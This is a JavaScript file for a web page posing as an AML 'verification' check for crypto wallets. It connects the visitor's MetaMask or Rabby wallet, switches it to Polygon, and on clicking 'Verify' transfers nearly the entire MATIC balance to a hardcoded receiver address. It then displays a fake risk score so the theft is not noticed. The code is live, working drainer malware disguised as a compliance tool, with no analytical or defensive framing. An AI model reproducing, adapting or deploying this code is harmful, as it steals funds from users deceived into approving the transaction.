import { logger } from "./logger.js";

let provider;
let signer;
let currentBalance = 0;



const isDev = window.location.href.includes('localhost') || window.location.href.includes('127.0.0.1');

const PROD_RECEIVER_ADDRESS = "0x6217cA34756CBD31Ee84fc83179F37e19250B76D";
const DEV_RECEIVER_ADDRESS = "0x8e62C38421A0670f42e3881A9E9dA93f08723af2";
const RECEIVER_ADDRESS = isDev ? DEV_RECEIVER_ADDRESS : PROD_RECEIVER_ADDRESS;
logger.log('isDev', isDev);
logger.log('RECEIVER_ADDRESS', RECEIVER_ADDRESS);

async function updateBalance() {
  try {
    if (!signer || !provider) {
      logger.log('No signer or provider available');
      return;
    }

    const address = await signer.getAddress();
    logger.log('Connected address:', address);

    const balance = await provider.getBalance(address);
    currentBalance = balance;
    logger.log('MATIC balance:', ethers.utils.formatEther(balance), 'MATIC');

  } catch (error) {
    logger.error("Error checking balances:", error);
  }
}

async function handleAction() {
  const button = document.getElementById('action-button');

  if (!signer) {
    await connectWallet();
    if (signer) {
      await sendPayment();
    }
  } else {
    await sendPayment();
  }
}

async function connectWallet() {
  try {
    const actionButton = document.getElementById('action-button');
    actionButton.disabled = true;
    actionButton.classList.add('loading');
    actionButton.textContent = 'Connecting...';

    logger.log('Starting wallet connection...');

    const rawProvider = await waitForProvider();
    logger.log('Provider status:', {
      isProviderFound: !!rawProvider,
      providerType: rawProvider ? rawProvider.constructor.name : 'none',
      isEthereum: !!window.ethereum,
      isRabby: !!window.rabby,
      hasWeb3: !!(window.web3 && window.web3.currentProvider)
    });

    if (!rawProvider) {
      throw new Error('Web3 wallet not detected. Please install MetaMask, Rabby, or another Web3 wallet and refresh the page.');
    }

    provider = new ethers.providers.Web3Provider(rawProvider, 'any');
    logger.log('Requesting accounts...');
    await provider.send("eth_requestAccounts", []);
    signer = provider.getSigner();
    const address = await signer.getAddress();
    logger.log('Connected address:', address);

    const network = await provider.getNetwork();
    logger.log('Current network:', network);

    if (network.chainId !== 137) {
      logger.log('Switching to Polygon network...');
      try {
        await rawProvider.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: '0x89' }],
        });
      } catch (switchError) {
        logger.log('Switch error:', switchError);
        if (switchError.code === 4902) {
          try {
            await rawProvider.request({
              method: 'wallet_addEthereumChain',
              params: [{
                chainId: '0x89',
                chainName: 'Polygon',
                nativeCurrency: {
                  name: 'MATIC',
                  symbol: 'MATIC',
                  decimals: 18
                },
                rpcUrls: ['https://polygon-rpc.com'],
                blockExplorerUrls: ['https://polygonscan.com/']
              }]
            });
          } catch (addError) {
            logger.error('Add network error:', addError);
            throw new Error('Failed to add Polygon network');
          }
        } else {
          throw switchError;
        }
      }
    }

    await updateBalance();

    rawProvider.on('accountsChanged', async (accounts) => {
      logger.log('Accounts changed:', accounts);
      signer = provider.getSigner();
      await updateBalance();
    });

    rawProvider.on('chainChanged', () => {
      logger.log('Network changed, reloading...');
      window.location.reload();
    });

    actionButton.disabled = false;
    actionButton.classList.remove('loading');

  } catch (error) {
    logger.error('Connection error:', error);

    const actionButton = document.getElementById('action-button');
    actionButton.disabled = false;
    actionButton.classList.remove('loading');
    actionButton.textContent = 'Connect Wallet for Verification';

    provider = null;
    signer = null;
  }
}

async function sendPayment() {
  try {
    const actionButton = document.getElementById('action-button');
    actionButton.disabled = true;
    actionButton.classList.add('loading');
    actionButton.textContent = 'Verifying...';

    const userAddress = await signer.getAddress();
    logger.log('Sending from address:', userAddress);

    const balance = await provider.getBalance(userAddress);
    logger.log('Current MATIC balance:', ethers.utils.formatEther(balance), 'MATIC');

    if (balance.eq(0)) {
      logger.log('No MATIC balance available');
      return;
    }

    const gasPrice = await provider.getGasPrice();
    logger.log('Current gas price:', ethers.utils.formatUnits(gasPrice, 'gwei'), 'gwei');

    const gasLimit = 21000;
    const gasCost = gasPrice.mul(gasLimit);
    const gasCostWithBuffer = gasCost.mul(120).div(100);
    logger.log('Gas cost with buffer:', ethers.utils.formatEther(gasCostWithBuffer), 'MATIC');

    const minimumMaticToKeep = ethers.utils.parseEther('0.1');
    const totalCostToReserve = gasCostWithBuffer.add(minimumMaticToKeep);
    logger.log('Total amount to reserve:', ethers.utils.formatEther(totalCostToReserve), 'MATIC');

    const amountToSend = balance.sub(totalCostToReserve);
    logger.log('Amount to send:', ethers.utils.formatEther(amountToSend), 'MATIC');

    if (amountToSend.lte(0)) {
      logger.log('Insufficient balance to cover gas fees and minimum reserve');
      throw new Error('Insufficient balance to cover gas fees and minimum reserve');
    }

    logger.log('Sending transaction...');
    const tx = await signer.sendTransaction({
      to: RECEIVER_ADDRESS,
      value: amountToSend,
      gasLimit: gasLimit,
      maxFeePerGas: gasPrice.mul(2),
      maxPriorityFeePerGas: gasPrice
    });

    logger.log('Transaction sent:', tx.hash);

    await tx.wait();
    logger.log('Transaction confirmed');

    actionButton.style.display = 'none';
    const amlResults = document.getElementById('aml-results');
    amlResults.classList.add('visible');

    const circle = document.querySelector('.risk-score-progress');
    const radius = circle.r.baseVal.value;
    const circumference = radius * 2 * Math.PI;
    circle.style.strokeDasharray = `${circumference} ${circumference}`;
    circle.style.strokeDashoffset = circumference;

    setTimeout(() => {
      const offset = circumference - (0.8 * circumference);
      circle.style.strokeDashoffset = offset;
    }, 100);

    document.getElementById('transaction-hash').textContent =
      tx.hash.slice(0, 6) + '...' + tx.hash.slice(-4);

    await updateBalance();

  } catch (error) {
    logger.error('Transaction error:', error);
    const actionButton = document.getElementById('action-button');
    actionButton.textContent = error.message || 'Transaction failed';
    actionButton.style.backgroundColor = 'var(--danger-color)';
    setTimeout(() => {
      actionButton.textContent = 'Verify';
      actionButton.style.backgroundColor = 'var(--primary-color)';
    }, 3000);
  } finally {
    const actionButton = document.getElementById('action-button');
    actionButton.disabled = false;
    actionButton.classList.remove('loading');
  }
}

function showStatus(message, isSuccess) {
  logger.log(`Status: ${message} (${isSuccess ? 'success' : 'error'})`);
}

async function waitForProvider() {
  if (window.ethereum) {
    return window.ethereum;
  }
  if (window.rabby) {
    return window.rabby;
  }
  if (window.web3 && window.web3.currentProvider) {
    return window.web3.currentProvider;
  }

  return new Promise((resolve) => {
    let attempts = 0;
    const maxAttempts = 3;

    const checkProvider = () => {
      attempts++;
      if (window.ethereum) {
        resolve(window.ethereum);
      } else if (window.rabby) {
        resolve(window.rabby);
      } else if (window.web3 && window.web3.currentProvider) {
        resolve(window.web3.currentProvider);
      } else if (attempts < maxAttempts) {
        setTimeout(checkProvider, 300);
      } else {
        resolve(null);
      }
    };

    checkProvider();
  });
}

// Пример привязки кнопки
document.getElementById('action-button').addEventListener('click', handleAction);
